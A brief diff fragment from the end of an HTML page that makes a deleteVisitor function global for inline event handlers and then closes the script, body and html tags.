+        // Expose function to global scope for inline event handlers
+        window.deleteVisitor = deleteVisitor;
+    </script>
+</body>
+</html>
